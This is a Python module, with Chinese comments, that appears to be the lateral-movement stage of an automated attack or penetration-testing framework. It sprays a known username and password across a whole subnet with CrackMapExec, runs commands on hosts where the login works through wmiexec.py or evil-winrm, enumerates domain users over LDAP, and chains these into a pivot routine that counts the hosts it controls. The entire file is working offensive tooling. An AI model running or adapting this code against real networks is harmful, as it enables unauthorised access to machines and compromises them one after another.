# -*- coding: utf-8 -*-
"""横向移动阶段：基于凭证真实尝试 SMB/WinRM。"""
from __future__ import annotations

import shutil
import subprocess
from typing import Any, Dict, List, Optional

DEFAULT_TIMEOUT = 120


def _run(cmd: List[str], timeout: int = DEFAULT_TIMEOUT) -> Dict[str, Any]:
    exe = shutil.which(cmd[0]) if cmd else None
    if not exe:
        return {"success": False, "error": f"工具 {cmd[0]} 未安装", "cmd": cmd}
    try:
        p = subprocess.run(
            [exe] + cmd[1:],
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding="utf-8",
            errors="replace",
        )
        return {"success": p.returncode == 0, "cmd": cmd, "stdout": p.stdout, "stderr": p.stderr}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"超时 ({timeout}s)", "cmd": cmd}
    except Exception as e:  # noqa: BLE001
        return {"success": False, "error": str(e), "cmd": cmd}


class LateralPhase:
    """横向移动：SMB / WinRM / LDAP。"""

    name = "lateral"

    # ---------- CrackMapExec SMB ----------
    def smb_spray(self, cidr: str, username: str, password: str, timeout: int = 180) -> Dict[str, Any]:
        """用已知凭证喷洒整个 CIDR，找出可登录主机。"""
        cmd = ["crackmapexec", "smb", cidr, "-u", username, "-p", password]
        r = _run(cmd, timeout=timeout)
        out = r.get("stdout") or ""
        hits: List[Dict[str, str]] = []
        for line in out.splitlines():
            # 典型行: 10.0.0.1 445 HOSTNAME Windows 7 6.1 ... (Pwn3d!)
            if any(tag in line for tag in ["(Pwn3d!)", "(Active)", "(Success)"]):
                parts = line.split()
                hits.append({
                    "host": parts[0] if parts else "",
                    "port": parts[1] if len(parts) > 1 else "445",
                    "raw": line,
                })
        r["hits"] = hits
        r["count"] = len(hits)
        return r

    # ---------- WMIEXEC / PsExec ----------
    def wmiexec(self, target: str, username: str, password: str, command: str = "whoami", timeout: int = 60) -> Dict[str, Any]:
        if shutil.which("wmiexec.py"):
            cmd = ["wmiexec.py", f"{username}:{password}@{target}", command]
        elif shutil.which("crackmapexec"):
            cmd = ["crackmapexec", "smb", target, "-u", username, "-p", password, "-x", command]
        else:
            return {"success": False, "error": "未安装 wmiexec.py / crackmapexec"}
        return _run(cmd, timeout=timeout)

    # ---------- WinRM ----------
    def winrm_exec(self, target: str, username: str, password: str, command: str = "whoami", timeout: int = 60) -> Dict[str, Any]:
        if shutil.which("evil-winrm"):
            cmd = ["evil-winrm", "-i", target, "-u", username, "-p", password, "-c", command]
            return _run(cmd, timeout=timeout)
        return {"success": False, "error": "evil-winrm 未安装", "hint": "gem install evil-winrm"}

    # ---------- LDAP 枚举找新凭证 ----------
    def ldap_enum(self, server: str, base_dn: str, username: str = "", password: str = "", timeout: int = 60) -> Dict[str, Any]:
        if username:
            cmd = ["ldapsearch", "-x", "-H", f"ldap://{server}", "-D", username, "-w", password, "-b", base_dn, "(objectClass=user)", "sAMAccountName", "memberOf"]
        else:
            cmd = ["ldapsearch", "-x", "-H", f"ldap://{server}", "-b", base_dn, "(objectClass=user)", "sAMAccountName", "memberOf"]
        r = _run(cmd, timeout=timeout)
        out = r.get("stdout") or ""
        users = [l.split(":", 1)[1].strip() for l in out.splitlines() if l.startswith("sAMAccountName:")]
        r["users"] = users
        r["count"] = len(users)
        return r

    # ---------- 横向到多主机 ----------
    def pivot(self, cidr: str, username: str, password: str) -> Dict[str, Any]:
        """完整横向：喷洒 → 命中主机执行 whoami。"""
        spray = self.smb_spray(cidr, username, password)
        results: List[Dict[str, Any]] = []
        for hit in spray.get("hits", [])[:5]:  # 限制前 5 台
            r = self.wmiexec(hit["host"], username, password)
            results.append({"host": hit["host"], "exec": r})
        return {"spray": spray, "exec_results": results, "hosts_controlled": len(results)}
